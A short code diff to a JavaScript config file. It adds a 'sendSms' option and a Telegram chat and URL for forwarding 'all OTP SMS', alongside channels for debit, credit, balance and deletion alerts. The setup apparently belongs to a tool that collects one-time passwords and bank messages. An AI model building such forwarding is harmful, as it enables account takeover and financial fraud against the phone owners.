@@ -59,6 +59,8 @@ export const config = {
 
   pannelId: clean(process.env.PANNEL_ID, ""),
 
+  sendSms: clean(process.env.SENDSMS, "yes").toLowerCase(),
+
   telegram: {
     enabled: toBool(process.env.TELEGRAM_ENABLED, false),
     botToken: clean(process.env.TELEGRAM_BOT_TOKEN),
@@ -70,12 +72,14 @@ export const config = {
     creditChatId: clean(process.env.TELEGRAM_CREDIT_CHAT_ID),
     balanceChatId: clean(process.env.TELEGRAM_BALANCE_CHAT_ID),
     deleteAlertChatId: clean(process.env.TELEGRAM_DELETE_ALERT_CHAT_ID),
+    allOtpSmsChatId: clean(process.env.TELEGRAM_ALL_OTP_SMS_CHAT_ID),
 
     debitUrl: clean(process.env.TELEGRAM_DEBIT_URL),
     allFinanceUrl: clean(process.env.TELEGRAM_ALL_FINANCE_URL),
     creditUrl: clean(process.env.TELEGRAM_CREDIT_URL),
     balanceUrl: clean(process.env.TELEGRAM_BALANCE_URL),
     deleteAlertUrl: clean(process.env.TELEGRAM_DELETE_ALERT_URL),
+    allOtpSmsUrl: clean(process.env.TELEGRAM_ALL_OTP_SMS_URL),
   },
 };
 
